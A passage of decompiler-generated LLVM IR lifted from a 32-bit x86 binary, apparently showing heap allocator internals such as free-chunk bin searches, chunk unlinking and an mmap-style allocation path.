  %v15_804fad7 = icmp eq i32 %v3_804fad7, %v4_804fad7
  br i1 %v15_804fad7, label %dec_label_pc_804fae1, label %dec_label_pc_804fadc

dec_label_pc_804fadc:                             ; preds = %dec_label_pc_804fad7, %dec_label_pc_804facf
  %v0_804fadc = call i32 @function_8050418()
  store i32 %v0_804fadc, i32* %eax.global-to-local, align 4
  %v0_804fae1.pre = load i32, i32* @ebx, align 4
  %v0_804fae7.pre = load i32, i32* @ecx, align 4
  %v1_804fae7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fae1

dec_label_pc_804fae1:                             ; preds = %dec_label_pc_804fad7, %dec_label_pc_804fadc
  %v1_804fae7 = phi i32 [ %v3_804facf, %dec_label_pc_804fad7 ], [ %v1_804fae7.pre, %dec_label_pc_804fadc ]
  %v0_804fae7 = phi i32 [ %v3_804fac3, %dec_label_pc_804fad7 ], [ %v0_804fae7.pre, %dec_label_pc_804fadc ]
  %v0_804fae1 = phi i32 [ %v1_804fac6, %dec_label_pc_804fad7 ], [ %v0_804fae1.pre, %dec_label_pc_804fadc ]
  %v5_804fae3 = sub i32 %v0_804fae1, %.v1_804f903
  store i32 %v5_804fae3, i32* %esi.global-to-local, align 4
  %v2_804fae7 = add i32 %v1_804fae7, 12
  %v3_804fae7 = inttoptr i32 %v2_804fae7 to i32*
  store i32 %v0_804fae7, i32* %v3_804fae7, align 4
  %v0_804faea = load i32, i32* @edx, align 4
  %v1_804faea = load i32, i32* @ecx, align 4
  %v2_804faea = add i32 %v1_804faea, 8
  %v3_804faea = inttoptr i32 %v2_804faea to i32*
  store i32 %v0_804faea, i32* %v3_804faea, align 4
  %v0_804faed = load i32, i32* %esi.global-to-local, align 4
  %v0_804faf0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804faf0 = add i32 %v0_804faf0, 8
  store i32 %v1_804faf0, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804faed, 16
  br i1 %tmp125, label %dec_label_pc_804fff1, label %dec_label_pc_804faf9

dec_label_pc_804faf9:                             ; preds = %dec_label_pc_804fae1
  %v2_804fafd = add i32 %v0_804faf0, %.v1_804f903
  store i32 %v2_804fafd, i32* %edx.global-to-local, align 4
  %v1_804fb00 = or i32 %.v1_804f903, 1
  store i32 %v1_804fb00, i32* %ebx.global-to-local, align 4
  %v2_804fb03 = add i32 %v0_804faf0, 4
  %v3_804fb03 = inttoptr i32 %v2_804fb03 to i32*
  store i32 %v1_804fb00, i32* %v3_804fb03, align 4
  %v0_804fb06 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb08 = or i32 %v0_804fb06, 1
  store i32 %v1_804fb08, i32* %eax.global-to-local, align 4
  %v0_804fb0b = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb0b = load i32, i32* @ebp, align 4
  %v2_804fb0b = add i32 %v1_804fb0b, 8
  %v3_804fb0b = inttoptr i32 %v2_804fb0b to i32*
  store i32 %v0_804fb0b, i32* %v3_804fb0b, align 4
  %v0_804fb0e = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb0e = load i32, i32* @ebp, align 4
  %v2_804fb0e = add i32 %v1_804fb0e, 12
  %v3_804fb0e = inttoptr i32 %v2_804fb0e to i32*
  store i32 %v0_804fb0e, i32* %v3_804fb0e, align 4
  %v0_804fb11 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb11 = add i32 %v0_804fb11, 8
  %v2_804fb11 = inttoptr i32 %v1_804fb11 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804fb11, align 4
  %v0_804fb18 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fb18 = add i32 %v0_804fb18, 12
  %v2_804fb18 = inttoptr i32 %v1_804fb18 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804fb18, align 4
  %v0_804fb1f = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb1f = load i32, i32* %edx.global-to-local, align 4
  %v2_804fb1f = add i32 %v1_804fb1f, 4
  %v3_804fb1f = inttoptr i32 %v2_804fb1f to i32*
  store i32 %v0_804fb1f, i32* %v3_804fb1f, align 4
  %v0_804fb22 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb22 = load i32, i32* %edx.global-to-local, align 4
  %v3_804fb22 = add i32 %v1_804fb22, %v0_804fb22
  %v4_804fb22 = inttoptr i32 %v3_804fb22 to i32*
  store i32 %v0_804fb22, i32* %v4_804fb22, align 4
  br label %dec_label_pc_804fff6

dec_label_pc_804fb2c:                             ; preds = %dec_label_pc_804fac0, %dec_label_pc_804fab0
  %v4_804fad7 = phi i32 [ %storemerge1.pre, %dec_label_pc_804fab0 ], [ %v3_804fac3, %dec_label_pc_804fac0 ]
  store i32 %v4_804fad7, i32* %eax.global-to-local, align 4
  %v12_804fb2c = icmp eq i32 %v4_804fad7, %v2_804fab4
  %v1_804fb2e = icmp eq i1 %v12_804fb2c, false
  br i1 %v1_804fb2e, label %dec_label_pc_804fac0, label %dec_label_pc_804fb30

dec_label_pc_804fb30:                             ; preds = %dec_label_pc_804fb2c, %dec_label_pc_804faa2
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804fb39 = add i32 %stack_var_-40.0.ph, 1
  %v2_804fb3c = udiv i32 %v1_804fb39, 32
  store i32 %v2_804fb3c, i32* @edi, align 4
  %v1_804fb3f = mul i32 %v1_804fb39, 8
  %v2_804fb3f = add i32 %v1_804fb3f, ptrtoint (i32* @global_var_805b56c.56 to i32)
  store i32 %v2_804fb3f, i32* %ebx.global-to-local, align 4
  %v1_804fb46 = urem i32 %v1_804fb39, 32
  %v2_804fb46 = icmp eq i32 %v1_804fb46, 0
  store i32 %v1_804fb46, i32* %ecx.global-to-local, align 4
  %v1_804fb49 = mul nuw nsw i32 %v2_804fb3c, 4
  %v2_804fb49 = add i32 %v1_804fb49, ptrtoint (i32* @global_var_805b874.60 to i32)
  %v3_804fb49 = inttoptr i32 %v2_804fb49 to i32*
  %v4_804fb49 = load i32, i32* %v3_804fb49, align 4
  store i32 %v4_804fb49, i32* %edx.global-to-local, align 4
  br i1 %v2_804fb46, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_804fb30
  %v5_804fb50 = shl i32 1, %v1_804fb46
  store i32 %v5_804fb50, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804fb30, %bb88, %dec_label_pc_804fb91
  %v1_804fb52 = phi i32 [ %v1_804fb52.pre, %dec_label_pc_804fb91 ], [ %v4_804fb49, %bb88 ], [ %v4_804fb49, %dec_label_pc_804fb30 ]
  %v0_804fb56 = phi i32 [ %v0_804fb52.pre, %dec_label_pc_804fb91 ], [ %v5_804fb50, %bb88 ], [ 1, %dec_label_pc_804fb30 ]
  %tmp89 = icmp ule i32 %v0_804fb56, %v1_804fb52
  %v1_804fb56 = icmp eq i32 %v0_804fb56, 0
  %v1_804fb58 = icmp eq i1 %v1_804fb56, false
  %or.cond = and i1 %tmp89, %v1_804fb58
  br i1 %or.cond, label %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge, label %dec_label_pc_804fb5a.preheader

dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge: ; preds = %.preheader
  %v0_804fb817.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb86.preheader

dec_label_pc_804fb5a.preheader:                   ; preds = %.preheader
  %v0_804fb5a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fb5a

dec_label_pc_804fb5a:                             ; preds = %dec_label_pc_804fb5a.preheader, %dec_label_pc_804fb64
  %v0_804fb5a = phi i32 [ %v0_804fb5a.pre, %dec_label_pc_804fb5a.preheader ], [ %v1_804fb5a, %dec_label_pc_804fb64 ]
  %v1_804fb5a = add i32 %v0_804fb5a, 1
  store i32 %v1_804fb5a, i32* @edi, align 4
  %v6_804fb5e = icmp ugt i32 %v1_804fb5a, 2
  br i1 %v6_804fb5e, label %dec_label_pc_804fc0d, label %dec_label_pc_804fb64

dec_label_pc_804fb64:                             ; preds = %dec_label_pc_804fb5a
  %v1_804fb64 = mul i32 %v1_804fb5a, 4
  %v2_804fb64 = add i32 %v1_804fb64, ptrtoint (i32* @global_var_805b874.60 to i32)
  %v3_804fb64 = inttoptr i32 %v2_804fb64 to i32*
  %v4_804fb64 = load i32, i32* %v3_804fb64, align 4
  store i32 %v4_804fb64, i32* %edx.global-to-local, align 4
  %v1_804fb6b = icmp eq i32 %v4_804fb64, 0
  br i1 %v1_804fb6b, label %dec_label_pc_804fb5a, label %dec_label_pc_804fb6f

dec_label_pc_804fb6f:                             ; preds = %dec_label_pc_804fb64
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804fb76 = mul i32 %v1_804fb5a, 256
  store i32 %v2_804fb76, i32* %eax.global-to-local, align 4
  %v1_804fb79 = add i32 %v2_804fb76, ptrtoint (i32* @global_var_805b56c.56 to i32)
  store i32 %v1_804fb79, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb86.preheader

dec_label_pc_804fb86.preheader:                   ; preds = %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge, %dec_label_pc_804fb6f
  %v0_804fb817 = phi i32 [ %v1_804fb79, %dec_label_pc_804fb6f ], [ %v0_804fb817.pre, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804fb6f ], [ %v0_804fb56, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %v0_804fb98 = phi i32 [ %v4_804fb64, %dec_label_pc_804fb6f ], [ %v1_804fb52, %dec_label_pc_804fb56.dec_label_pc_804fb86.preheader_crit_edge ]
  %v2_804fb864 = and i32 %v0_804fb98, %esi.promoted
  %v3_804fb865 = icmp eq i32 %v2_804fb864, 0
  br i1 %v3_804fb865, label %dec_label_pc_804fb81, label %dec_label_pc_804fb8a

dec_label_pc_804fb81:                             ; preds = %dec_label_pc_804fb86.preheader, %dec_label_pc_804fb81
  %v2_804fb8418 = phi i32 [ %v2_804fb84, %dec_label_pc_804fb81 ], [ %esi.promoted, %dec_label_pc_804fb86.preheader ]
  %v0_804fb818 = phi i32 [ %v1_804fb81, %dec_label_pc_804fb81 ], [ %v0_804fb817, %dec_label_pc_804fb86.preheader ]
  %v1_804fb81 = add i32 %v0_804fb818, 8
  %v2_804fb84 = mul i32 %v2_804fb8418, 2
  %v2_804fb86 = and i32 %v2_804fb84, %v0_804fb98
  %v3_804fb86 = icmp eq i32 %v2_804fb86, 0
  br i1 %v3_804fb86, label %dec_label_pc_804fb81, label %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge

dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge: ; preds = %dec_label_pc_804fb81
  store i32 %v1_804fb81, i32* %ebx.global-to-local, align 4
  store i32 %v2_804fb84, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fb8a

dec_label_pc_804fb8a:                             ; preds = %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge, %dec_label_pc_804fb86.preheader
  %v0_804fb9a = phi i32 [ %v2_804fb84, %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge ], [ %esi.promoted, %dec_label_pc_804fb86.preheader ]
  %v1_804fbb4 = phi i32 [ %v1_804fb81, %dec_label_pc_804fb86.dec_label_pc_804fb8a_crit_edge ], [ %v0_804fb817, %dec_label_pc_804fb86.preheader ]
  %v1_804fb8a = add i32 %v1_804fbb4, 12
  %v2_804fb8a = inttoptr i32 %v1_804fb8a to i32*
  %v3_804fb8a = load i32, i32* %v2_804fb8a, align 4
  store i32 %v3_804fb8a, i32* %ecx.global-to-local, align 4
  %v12_804fb8d = icmp eq i32 %v3_804fb8a, %v1_804fbb4
  %v1_804fb8f = icmp eq i1 %v12_804fb8d, false
  br i1 %v1_804fb8f, label %dec_label_pc_804fba5, label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb8a
  %v1_804fb93 = add i32 %v3_804fb8a, 8
  store i32 %v1_804fb93, i32* %ebx.global-to-local, align 4
  %v1_804fb96 = sub i32 -1, %v0_804fb9a
  store i32 %v1_804fb96, i32* %eax.global-to-local, align 4
  %v2_804fb98 = and i32 %v0_804fb98, %v1_804fb96
  store i32 %v2_804fb98, i32* %edx.global-to-local, align 4
  %v2_804fb9a = mul i32 %v0_804fb9a, 2
  store i32 %v2_804fb9a, i32* %esi.global-to-local, align 4
  %v1_804fb9c = load i32, i32* @edi, align 4
  %v2_804fb9c = mul i32 %v1_804fb9c, 4
  %v3_804fb9c = add i32 %v2_804fb9c, ptrtoint (i32* @global_var_805b874.60 to i32)
  %v4_804fb9c = inttoptr i32 %v3_804fb9c to i32*
  store i32 %v2_804fb98, i32* %v4_804fb9c, align 4
  %v0_804fb52.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb52.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804fba5:                             ; preds = %dec_label_pc_804fb8a
  %v1_804fba5 = add i32 %v3_804fb8a, 4
  %v2_804fba5 = inttoptr i32 %v1_804fba5 to i32*
  %v3_804fba5 = load i32, i32* %v2_804fba5, align 4
  store i32 %v3_804fba5, i32* %edx.global-to-local, align 4
  %v1_804fba8 = add i32 %v3_804fb8a, 12
  %v2_804fba8 = inttoptr i32 %v1_804fba8 to i32*
  %v3_804fba8 = load i32, i32* %v2_804fba8, align 4
  store i32 %v3_804fba8, i32* %eax.global-to-local, align 4
  %v1_804fbab = and i32 %v3_804fba5, -4
  store i32 %v1_804fbab, i32* %edx.global-to-local, align 4
  %v5_804fbb0 = sub i32 %v1_804fbab, %.v1_804f903
  store i32 %v5_804fbb0, i32* %esi.global-to-local, align 4
  store i32 %v3_804fba8, i32* %v2_804fb8a, align 4
  %v0_804fbb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbb7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fbb7 = add i32 %v1_804fbb7, 8
  %v3_804fbb7 = inttoptr i32 %v2_804fbb7 to i32*
  store i32 %v0_804fbb7, i32* %v3_804fbb7, align 4
  %v0_804fbba = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_804fbba, 16
  br i1 %tmp126, label %dec_label_pc_804fbbf, label %dec_label_pc_804fbc6

dec_label_pc_804fbbf:                             ; preds = %dec_label_pc_804fba5
  %v0_804fbbf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fbbf = load i32, i32* %edx.global-to-local, align 4
  %v2_804fbbf = add i32 %v0_804fbbf, 4
  %v3_804fbbf = add i32 %v2_804fbbf, %v1_804fbbf
  %v4_804fbbf = inttoptr i32 %v3_804fbbf to i32*
  %v5_804fbbf = load i32, i32* %v4_804fbbf, align 4
  %v6_804fbbf = or i32 %v5_804fbbf, 1
  store i32 %v6_804fbbf, i32* %v4_804fbbf, align 4
  br label %dec_label_pc_804fc05

dec_label_pc_804fbc6:                             ; preds = %dec_label_pc_804fba5
  store i32 %.v1_804f903, i32* %eax.global-to-local, align 4
  %v0_804fbcf = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fbcf = add i32 %v0_804fbcf, %.v1_804f903
  store i32 %v2_804fbcf, i32* %edx.global-to-local, align 4
  %v1_804fbd2 = load i32, i32* @ebp, align 4
  %v2_804fbd2 = add i32 %v1_804fbd2, 8
  %v3_804fbd2 = inttoptr i32 %v2_804fbd2 to i32*
  store i32 %v2_804fbcf, i32* %v3_804fbd2, align 4
  %v0_804fbd5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbd5 = load i32, i32* @ebp, align 4
  %v2_804fbd5 = add i32 %v1_804fbd5, 12
  %v3_804fbd5 = inttoptr i32 %v2_804fbd5 to i32*
  store i32 %v0_804fbd5, i32* %v3_804fbd5, align 4
  %v0_804fbd8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbd8 = add i32 %v0_804fbd8, 8
  %v2_804fbd8 = inttoptr i32 %v1_804fbd8 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804fbd8, align 4
  %v0_804fbdf = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbdf = add i32 %v0_804fbdf, 12
  %v2_804fbdf = inttoptr i32 %v1_804fbdf to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804fbdf, align 4
  br i1 %v6_804f95b, label %dec_label_pc_804fbee, label %dec_label_pc_804fbe8

dec_label_pc_804fbe8:                             ; preds = %dec_label_pc_804fbc6
  %v0_804fbe8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fbe8, i32* @global_var_805b570.57, align 16
  br label %dec_label_pc_804fbee

dec_label_pc_804fbee:                             ; preds = %dec_label_pc_804fbc6, %dec_label_pc_804fbe8
  %v4_804fbee = or i32 %.v1_804f903, 1
  %v0_804fbf3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804fbee, i32* %ebx.global-to-local, align 4
  %v1_804fbf9 = or i32 %v0_804fbf3, 1
  store i32 %v1_804fbf9, i32* %eax.global-to-local, align 4
  %v1_804fbfc = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fbfc = add i32 %v1_804fbfc, 4
  %v3_804fbfc = inttoptr i32 %v2_804fbfc to i32*
  store i32 %v4_804fbee, i32* %v3_804fbfc, align 4
  %v0_804fbff = load i32, i32* %esi.global-to-local, align 4
  %v1_804fbff = load i32, i32* %edx.global-to-local, align 4
  %v3_804fbff = add i32 %v1_804fbff, %v0_804fbff
  %v4_804fbff = inttoptr i32 %v3_804fbff to i32*
  store i32 %v0_804fbff, i32* %v4_804fbff, align 4
  %v0_804fc02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc02 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc02 = add i32 %v1_804fc02, 4
  %v3_804fc02 = inttoptr i32 %v2_804fc02 to i32*
  store i32 %v0_804fc02, i32* %v3_804fc02, align 4
  br label %dec_label_pc_804fc05

dec_label_pc_804fc05:                             ; preds = %dec_label_pc_804fbbf, %dec_label_pc_804fbee
  %v0_804fc05 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fc05 = add i32 %v0_804fc05, 8
  store i32 %v1_804fc05, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fc0d:                             ; preds = %dec_label_pc_804fb5a, %dec_label_pc_804f915, %dec_label_pc_804f91d
  %v0_804fc0d = load i32, i32* @global_var_805b56c.56, align 4
  store i32 %v0_804fc0d, i32* @ebx, align 4
  %v1_804fc17 = add i32 %.v1_804f903, 16
  store i32 %v1_804fc17, i32* @esi, align 4
  %v1_804fc1a = add i32 %v0_804fc0d, 4
  %v2_804fc1a = inttoptr i32 %v1_804fc1a to i32*
  %v3_804fc1a = load i32, i32* %v2_804fc1a, align 4
  %v1_804fc21 = and i32 %v3_804fc1a, -4
  store i32 %v1_804fc21, i32* %ecx.global-to-local, align 4
  %v7_804fc24 = icmp ult i32 %v1_804fc21, %v1_804fc17
  br i1 %v7_804fc24, label %dec_label_pc_804fc44, label %dec_label_pc_804fc28

dec_label_pc_804fc28:                             ; preds = %dec_label_pc_804fc0d
  %v2_804fc2c = add i32 %v0_804fc0d, %.v1_804f903
  store i32 %v2_804fc2c, i32* %edx.global-to-local, align 4
  %v1_804fc2f = or i32 %.v1_804f903, 1
  store i32 %v1_804fc2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804fc2c, i32* @global_var_805b56c.56, align 4
  store i32 %v1_804fc2f, i32* %v2_804fc1a, align 4
  %v0_804fc3b = load i32, i32* %ecx.global-to-local, align 4
  %v5_804fc3b = sub i32 %v0_804fc3b, %.v1_804f903
  store i32 %v5_804fc3b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff97

dec_label_pc_804fc44:                             ; preds = %dec_label_pc_804fc0d
  %v0_804fc44 = load i32, i32* @global_var_805b89c.61, align 4
  store i32 %v0_804fc44, i32* %edx.global-to-local, align 4
  %v0_804fc4a = load i8, i8* @global_var_805b540.55, align 64
  %v1_804fc4a = and i8 %v0_804fc4a, 2
  %v2_804fc4a = icmp eq i8 %v1_804fc4a, 0
  br i1 %v2_804fc4a, label %dec_label_pc_804fc78, label %dec_label_pc_804fc53

dec_label_pc_804fc53:                             ; preds = %dec_label_pc_804fc44
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* %stack_var_-92, align 4
  %v2_804fc5b = call i32 @function_80500b1(i32* bitcast (i8* @global_var_805b540.55 to i32*))
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* @ebx, align 4
  %v1_804fc65 = add i32 %.v1_804f903, -7
  store i32 %v1_804fc65, i32* %eax.global-to-local, align 4
  store i32 %v1_804fc65, i32* %stack_var_-92, align 4
  %v1_804fc69 = call i32 @function_804f8ae(i32 %v1_804fc65)
  store i32 %v1_804fc69, i32* %eax.global-to-local, align 4
  store i32 %v1_804fc69, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fc78:                             ; preds = %dec_label_pc_804fc44
  %v1_804fc78 = add i32 %v0_804fc44, -1
  store i32 %v1_804fc78, i32* @ecx, align 4
  store i32 %.v1_804f903, i32* @ebx, align 4
  %v1_804fc83 = load i32, i32* @global_var_805b88c.62, align 4
  %v7_804fc83 = icmp ult i32 %.v1_804f903, %v1_804fc83
  br i1 %v7_804fc83, label %dec_label_pc_804fd45, label %dec_label_pc_804fc8f

dec_label_pc_804fc8f:                             ; preds = %dec_label_pc_804fc78
  %v0_804fc8f = load i32, i32* @global_var_805b890.63, align 16
  store i32 %v0_804fc8f, i32* %eax.global-to-local, align 4
  %v1_804fc94 = load i32, i32* @global_var_805b894.64, align 4
  %v5_804fc9a = icmp slt i32 %v0_804fc8f, %v1_804fc94
  br i1 %v5_804fc9a, label %dec_label_pc_804fca0, label %dec_label_pc_804fd45

dec_label_pc_804fca0:                             ; preds = %dec_label_pc_804fc8f
  %v2_804fca2 = add i32 %.v1_804f903, 10
  %v3_804fca2 = add i32 %v2_804fca2, %v0_804fc44
  %v1_804fca6 = sub i32 0, %v0_804fc44
  store i32 %v1_804fca6, i32* %eax.global-to-local, align 4
  %v2_804fca8 = and i32 %v3_804fca2, %v1_804fca6
  store i32 %v2_804fca8, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_804fca8, %.v1_804f903
  br i1 %tmp127, label %dec_label_pc_804fcb4, label %dec_label_pc_804fd45

dec_label_pc_804fcb4:                             ; preds = %dec_label_pc_804fca0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804fcc1 = call i32 @function_8051110(i32 0, i32 %v2_804fca8, i32 3, i32 34, i32 0, i32 0, i32 %v1_804fc78, i32 %v1_804fc78)
  store i32 %v8_804fcc1, i32* %eax.global-to-local, align 4
  store i32 %v8_804fcc1, i32* %edx.global-to-local, align 4
  %v10_804fccb = icmp eq i32 %v8_804fcc1, -1
  br i1 %v10_804fccb, label %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge, label %dec_label_pc_804fcd0

dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge: ; preds = %dec_label_pc_804fcb4
  %v0_804fd45.pre = load i32, i32* @global_var_805b56c.56, align 4
  br label %dec_label_pc_804fd45

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fcb4
  %v1_804fcd2 = urem i32 %v8_804fcc1, 8
  %v2_804fcd2 = icmp eq i32 %v1_804fcd2, 0
  store i32 %v1_804fcd2, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fcd2, label %dec_label_pc_804fcea, label %dec_label_pc_804fcd7

dec_label_pc_804fcd7:                             ; preds = %dec_label_pc_804fcd0
  %v0_804fcdc = load i32, i32* @ebx, align 4
  %v2_804fcde = sub nsw i32 8, %v1_804fcd2
  store i32 %v2_804fcde, i32* %eax.global-to-local, align 4
  %v2_804fce0 = add i32 %v2_804fcde, %v8_804fcc1
  store i32 %v2_804fce0, i32* %edx.global-to-local, align 4
  %v2_804fce2 = sub i32 %v0_804fcdc, %v2_804fcde
  store i32 %v2_804fce2, i32* %esi.global-to-local, align 4
  %v2_804fce4 = inttoptr i32 %v2_804fce0 to i32*
  store i32 %v2_804fcde, i32* %v2_804fce4, align 4
  br label %dec_label_pc_804fcf2

dec_label_pc_804fcea:                             ; preds = %dec_label_pc_804fcd0
  %v1_804fcea = inttoptr i32 %v8_804fcc1 to i32*
  store i32 0, i32* %v1_804fcea, align 4
  br label %dec_label_pc_804fcf2

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804fcd7, %dec_label_pc_804fcea
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804fcd7 ], [ @ebx, %dec_label_pc_804fcea ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804fcf2 = or i32 %storemerge, 2
  %v1_804fcf5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fcf5 = add i32 %v1_804fcf5, 4
  %v3_804fcf5 = inttoptr i32 %v2_804fcf5 to i32*
  store i32 %v1_804fcf2, i32* %v3_804fcf5, align 4
  %v0_804fcf8 = load i32, i32* @global_var_805b890.63, align 16
  %v1_804fcfd = add i32 %v0_804fcf8, 1
  store i32 %v1_804fcfd, i32* %eax.global-to-local, align 4
  store i32 %v1_804fcfd, i32* @global_var_805b890.63, align 16
  %v1_804fd03 = load i32, i32* @global_var_805b898.65, align 8
  %v7_804fd09 = icmp sgt i32 %v1_804fcfd, %v1_804fd03
  br i1 %v7_804fd09, label %dec_label_pc_804fd0b, label %dec_label_pc_804fd10

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fcf2
  store i32 %v1_804fcfd, i32* @global_var_805b898.65, align 8
  br label %dec_label_pc_804fd10

dec_label_pc_804fd10:                             ; preds = %dec_label_pc_804fcf2, %dec_label_pc_804fd0b
  %v0_804fd10 = load i32, i32* @global_var_805b8a4.66, align 4
  %v1_804fd15 = load i32, i32* @ebx, align 4
  %v2_804fd15 = add i32 %v1_804fd15, %v0_804fd10
  store i32 %v2_804fd15, i32* %eax.global-to-local, align 4
  store i32 %v2_804fd15, i32* @global_var_805b8a4.66, align 4
  %v1_804fd1c = load i32, i32* @global_var_805b8b0.67, align 16
  %tmp128 = icmp ugt i32 %v2_804fd15, %v1_804fd1c
  br i1 %tmp128, label %dec_label_pc_804fd24, label %dec_label_pc_804fd29

dec_label_pc_804fd24:                             ; preds = %dec_label_pc_804fd10
  store i32 %v2_804fd15, i32* @global_var_805b8b0.67, align 16
  br label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %dec_label_pc_804fd10, %dec_label_pc_804fd24
  %v1_804fd29 = load i32, i32* @global_var_805b8a8.68, align 8
  %v2_804fd29 = add i32 %v1_804fd29, %v2_804fd15
  store i32 %v2_804fd29, i32* %eax.global-to-local, align 4
  %v1_804fd2f = load i32, i32* @global_var_805b8b4.69, align 4
  %tmp129 = icmp ugt i32 %v2_804fd29, %v1_804fd2f
  br i1 %tmp129, label %dec_label_pc_804fd3b, label %dec_label_pc_804f98c

dec_label_pc_804fd3b:                             ; preds = %dec_label_pc_804fd29
  store i32 %v2_804fd29, i32* @global_var_805b8b4.69, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804fd45:                             ; preds = %dec_label_pc_804fca0, %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge, %dec_label_pc_804fc8f, %dec_label_pc_804fc78
  %v0_804fd45 = phi i32 [ %v0_804fd45.pre, %dec_label_pc_804fcb4.dec_label_pc_804fd45_crit_edge ], [ %v0_804fc0d, %dec_label_pc_804fc8f ], [ %v0_804fc0d, %dec_label_pc_804fca0 ], [ %v0_804fc0d, %dec_label_pc_804fc78 ]
  store i32 %v0_804fd45, i32* %eax.global-to-local, align 4
  %v1_804fd4e = add i32 %v0_804fd45, 4
  %v2_804fd4e = inttoptr i32 %v1_804fd4e to i32*
  %v3_804fd4e = load i32, i32* %v2_804fd4e, align 4
  %v1_804fd58 = and i32 %v3_804fd4e, -4
  %v2_804fd58 = icmp eq i32 %v1_804fd58, 0
  store i32 %v1_804fd58, i32* @ebp, align 4
  %v1_804fd5b = load i32, i32* @global_var_805b888.70, align 8
  %v2_804fd5b = add i32 %v1_804fd5b, %v1_804fc17
  store i32 %v2_804fd5b, i32* %eax.global-to-local, align 4
  %v0_804fd61 = load i8, i8* @global_var_805b8a0.71, align 32
  %v1_804fd61 = urem i8 %v0_804fd61, 2
  %v2_804fd61 = icmp eq i8 %v1_804fd61, 0
  br i1 %v2_804fd61, label %dec_label_pc_804fd6c, label %dec_label_pc_804fd6a

dec_label_pc_804fd6a:                             ; preds = %dec_label_pc_804fd45
  %v2_804fd6a = sub i32 %v2_804fd5b, %v1_804fd58
  store i32 %v2_804fd6a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd6c

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd45, %dec_label_pc_804fd6a
  %v0_804fd70 = phi i32 [ %v2_804fd5b, %dec_label_pc_804fd45 ], [ %v2_804fd6a, %dec_label_pc_804fd6a ]
  %v5_804fd70 = add i32 %v0_804fd70, %v1_804fc78
  store i32 %v5_804fd70, i32* %eax.global-to-local, align 4
  %v1_804fd74 = sub i32 0, %v0_804fc44
  store i32 %v1_804fd74, i32* %edx.global-to-local, align 4
  %v2_804fd7c = and i32 %v5_804fd70, %v1_804fd74
  store i32 %v2_804fd7c, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_804fd7c, 1
  br i1 %tmp91, label %dec_label_pc_804fd96, label %dec_label_pc_804fd80

